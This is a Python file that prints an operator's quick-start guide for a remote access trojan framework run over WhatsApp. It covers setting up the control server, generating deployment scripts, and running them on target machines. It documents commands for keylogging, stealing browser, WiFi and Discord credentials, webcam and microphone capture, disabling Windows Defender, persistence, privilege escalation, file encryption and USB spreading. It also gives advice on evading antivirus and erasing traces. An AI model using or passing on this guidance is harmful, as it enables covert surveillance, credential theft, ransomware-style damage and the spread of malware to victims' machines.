#!/usr/bin/env python3
"""
T0OL-B4S3-263 QUICK START GUIDE
Follow these steps to get up and running
"""

QUICK_START = r"""
╔════════════════════════════════════════════════════════════════════════════╗
║                     T0OL-B4S3-263 QUICK START GUIDE                        ║
║              Complete RAT Framework with Multi-Channel C2                   ║
╚════════════════════════════════════════════════════════════════════════════╝

[PHASE 1] INSTALLATION & SETUP (5-10 minutes)
═══════════════════════════════════════════════════════════════════════════

1. Install Python Dependencies
   $ pip3 install -r requirements.txt

2. Install Node.js Dependencies (WhatsApp Bot)
   $ cd whatsapp-c2
   $ npm install
   $ cd ..

3. Run Interactive Setup
   $ python3 launcher.py
   
   Select: "1 - Quick Setup"
   
   This will:
   ✓ Configure C2 server (host/port)
   ✓ Configure payload (beacon interval, jitter)
   ✓ Configure WhatsApp bot (admin numbers)
   ✓ Setup obfuscation (evasion techniques)
   ✓ Initialize database (session tracking)

4. Verify Configuration
   $ python3 launcher.py
   Select: "7 - View Configuration Summary"


[PHASE 2] START C2 SERVER (2 minutes)
═══════════════════════════════════════════════════════════════════════════

1. Start the C2 Server (handles all compromised systems)
   $ python3 rat_server_fixed.py
   
   Expected output:
   [*] C2 Server started on 0.0.0.0:5000
   [*] Encryption key: [Fernet-key]
   [*] Database: sessions.db
   [*] Waiting for connections...

2. Verify Server (in another terminal)
   $ python3 launcher.py
   Select: "6 - Deploy & Test"
   → Tests DNS resolution
   → Tests C2 connectivity
   → Generates deployment scripts


[PHASE 3] START WHATSAPP BOT (3-5 minutes)
═══════════════════════════════════════════════════════════════════════════

1. Start the WhatsApp Bot
   $ cd whatsapp-c2
   $ npm start
   
   Expected output:
   [*] Connecting to C2...
   [*] Scanning QR code...
   
   A QR code will appear - scan with WhatsApp

2. Save the Session (avoid rescanning)
   ✓ Bot saves session automatically to .wwebjs_auth

3. Verify Connection
   Send message to bot: /help
   Expected: Full command list


[PHASE 4] GENERATE & DEPLOY PAYLOAD (5 minutes)
═══════════════════════════════════════════════════════════════════════════

1. Generate Deployment Script
   $ python3 launcher.py
   Select: "6 - Deploy & Test"
   
   This creates:
   ✓ deploy_windows.ps1 (PowerShell script)
   ✓ deploy_linux.sh (Bash script)

2. Customize Payload (Optional)
   Edit rat_ultimate.py:
   - Change C2_HOST and C2_PORT at top
   - Adjust BEACON_INTERVAL (30 sec default)
   - Set obfuscation level (OBFUSCATION_LEVEL)

3. Deploy to Target
   
   Windows (via PowerShell):
   $ powershell -ExecutionPolicy Bypass -File deploy_windows.ps1
   
   Linux (via Bash):
   $ bash deploy_linux.sh

4. Monitor Connection
   WhatsApp message: /sessions
   Expected: [+] Found 1 active session(s)


[PHASE 5] BASIC OPERATIONS
═══════════════════════════════════════════════════════════════════════════

1. Check Active Sessions
   WhatsApp: /sessions
   Response: Lists all connected systems

2. Get System Information
   WhatsApp: /sysinfo 1
   Response: OS, hostname, username, privileges, etc.

3. Take Screenshot
   WhatsApp: /screenshot 1
   Response: Screenshot image saved locally

4. Run Basic Surveillance
   WhatsApp: /keylogs 1 100
   Response: Last 100 keystrokes with context

5. Get Credentials
   WhatsApp: /passwords 1
   Response: Chrome, Firefox, WiFi, Discord credentials

6. List Processes
   WhatsApp: /processes 1
   Response: All running processes with PIDs

7. Network Scan
   WhatsApp: /netscan 1 192.168.1.0/24
   Response: All live hosts on network

8. Execute Command
   WhatsApp: /exec 1 whoami
   Response: Command output


[ADVANCED OPERATIONS]
═══════════════════════════════════════════════════════════════════════════

1. Establish Persistence (survives reboot)
   WhatsApp: /persist 1
   
2. Disable Windows Defender
   WhatsApp: /defenderoff 1
   
3. Escalate Privileges
   WhatsApp: /elevate 1
   
4. Fun Prank (flip desktop)
   WhatsApp: /prank 1
   
5. Timelapse (screenshots over time)
   WhatsApp: /timelapse 1 30 60
   Takes screenshot every 30 seconds for 60 minutes

6. Ransomware Simulation (encrypts files)
   WhatsApp: /encrypt 1 C:\Users\target\Documents
   
7. USB Spreading (propagate to USB drives)
   WhatsApp: /usb 1

8. Self-Destruct (cleanup & exit)
   WhatsApp: /selfdestruct 1


[COMMAND REFERENCE]
═══════════════════════════════════════════════════════════════════════════

RECONNAISSANCE:
  /sysinfo [id]              System information
  /processes [id]            List running processes
  /software [id]             Installed applications
  /network_scan [id] [range] Network enumeration
  /wifi [id]                 Nearby WiFi networks
  
CREDENTIALS:
  /passwords [id]            Chrome/Firefox/Windows passwords
  /wifi [id]                 Saved WiFi credentials
  /history [id]              Browser history
  /discord [id]              Discord token (if running)
  
SURVEILLANCE:
  /screenshot [id]           Take screenshot
  /keylogs [id] [count]      Get keystrokes
  /clipboard [id]            Clipboard contents
  /record [id] [seconds]     Record microphone
  /webcam [id]               Webcam snapshot
  /timelapse [id] [int] [dur] Screenshots over time
  
SYSTEM:
  /info [id]                 Quick system info
  /shutdown [id]             Shutdown system
  /reboot [id]               Reboot system
  /exec [id] [command]       Execute command
  
PERSISTENCE:
  /persist [id]              Install persistence
  /elevate [id]              Escalate privileges
  /defenderoff [id]          Disable Windows Defender
  
ATTACK:
  /encrypt [id] [path]       Ransomware simulation
  /usb [id]                  Spread to USB devices
  /netscan [id] [range]      Scan network
  
CLEANUP:
  /selfdestruct [id]         Remove payload & exit
  /cleanup [id]              Delete logs/temp
  
MANAGEMENT:
  /sessions                  List active sessions
  /help                      Show this help
  /help [command]            Help for specific command


[TROUBLESHOOTING]
═══════════════════════════════════════════════════════════════════════════

Issue: "Connection refused"
  → C2 server not running (php3 rat_server_fixed.py)
  → Firewall blocking port (check C2_PORT)
  → Wrong host/port in payload config

Issue: "QR code won't appear"
  → Run in terminal with graphics support
  → Install: sudo apt-get install qrencode
  → Try again: npm start

Issue: "No sessions connecting"
  → Payload deployed to unreachable network
  → C2 host/port not accessible from target
  → Wrong encryption key
  → Test with: /test command on WhatsApp

Issue: "Commands timeout"
  → Network latency too high
  → Payload crashed (check C2 logs)
  → Increase timeout: rat_server_fixed.py line ~200

Issue: "Database corruption"
  → Delete sessions.db and re-run setup
  → Use backup if available
  → Check disk space


[SECURITY BEST PRACTICES]
═══════════════════════════════════════════════════════════════════════════

1. Encryption
   ✓ All C2 communications encrypted (Fernet)
   ✓ Keys changed for each deployment
   ✓ Never share encryption keys

2. Obfuscation
   ✓ Always use "maximum" level for real operations
   ✓ Use polymorphic compilation for variants
   ✓ Change obfuscation between deployments

3. OpSec
   ✓ Use VPN for C2 server hosting
   ✓ Rotate C2 domains regularly
   ✓ Monitor for blue team signatures
   ✓ Use multi-channel C2 for redundancy

4. Cleanup
   ✓ Delete C2 logs before shutdown
   ✓ Wipe database with overwrite (not delete)
   ✓ Run /selfdestruct on all sessions first
   ✓ Disable persistence before testing

5. OPSEC (Operational Security)
   ✓ Use Tor for C2 server management
   ✓ Rotate WhatsApp numbers
   ✓ Don't test from C2 host
   ✓ Use separate network for command/control


[CONFIGURATION FILES CREATED]
═══════════════════════════════════════════════════════════════════════════

After setup, these files are created/modified:

whatsapp-c2/config.json
  → WhatsApp bot configuration
  → C2 connection details
  → Encryption key

.env
  → Environment variables for C2 server
  → Database path
  → Encryption settings
  → Debug flag

payload_config.json
  → Payload-specific configuration
  → Beacon interval & jitter
  → C2 target address

sessions.db
  → SQLite database
  → Track compromised systems
  → Command history
  → Harvested credentials

deploy_windows.ps1
  → PowerShell deployment script
  → AMSI bypass
  → Defender disable
  → Persistence setup

deploy_linux.sh
  → Bash deployment script
  → Crontab persistence
  → Hidden directory


[NEXT STEPS]
═══════════════════════════════════════════════════════════════════════════

After successful deployment:

1. Monitor Sessions
   → Regular /sessions checks
   → Track uptime & last seen
   → Identify suspicious activity

2. Optimize Obfuscation
   → Test against AV/EDR
   → Adjust obfuscation level
   → Re-compile if detected

3. Expand Attack Surface
   → Deploy to additional targets
   → Create polymorphic variants
   → Use domain fronting for resilience

4. Maintain Persistence
   → Check heartbeats regularly
   → Re-deploy before expiration
   → Update configuration remotely

5. Data Exfiltration
   → Prioritize high-value data
   → Use encrypted channels
   → Implement dead drop methods


[HELP & DOCUMENTATION]
═══════════════════════════════════════════════════════════════════════════

For detailed information:

1. Configuration Reference
   $ python3 config_reference.py
   $ python3 config_reference.py c2_server

2. Advanced Setup Features
   $ cat SETUP_ADVANCED.md

3. Project Status & Changes
   $ cat PROJECT_STATUS.txt
   $ cat FIX_SUMMARY.md

4. Original README
   $ cat README.md


[GETTING HELP]
═══════════════════════════════════════════════════════════════════════════

1. Check logs
   C2 Server: Check rat_server_fixed.py output
   WhatsApp: Check npm start output
   Payload: Check Windows Event Viewer

2. Verify configuration
   $ python3 launcher.py → Option 7 (View Summary)
   $ cat whatsapp-c2/config.json
   $ sqlite3 sessions.db "SELECT COUNT(*) FROM sessions;"

3. Test connectivity
   $ python3 launcher.py → Option 6 (Deploy & Test)

4. Debug payload
   Add print() statements to rat_ultimate.py
   Or use ProcessMonitor/WireShark to monitor activity


╔════════════════════════════════════════════════════════════════════════════╗
║                       DEPLOYMENT CHECKLIST                                ║
╚════════════════════════════════════════════════════════════════════════════╝

Before deploying to targets:

□ Configuration complete (python3 launcher.py)
□ C2 server running (python3 rat_server_fixed.py)
□ WhatsApp bot running (npm start in whatsapp-c2/)
□ Connectivity tests pass (/test command works)
□ Obfuscation level set to "maximum"
□ Deployment scripts generated (deploy_windows.ps1, deploy_linux.sh)
□ Payload tested in isolated environment
□ OpSec procedures documented
□ Backup of configuration created
□ Monitoring dashboard ready (/sessions works)


Ready to deploy! Execute deploy_windows.ps1 or deploy_linux.sh on target.
Monitor via WhatsApp: /sessions

═════════════════════════════════════════════════════════════════════════════
"""

if __name__ == '__main__':
    print(QUICK_START)
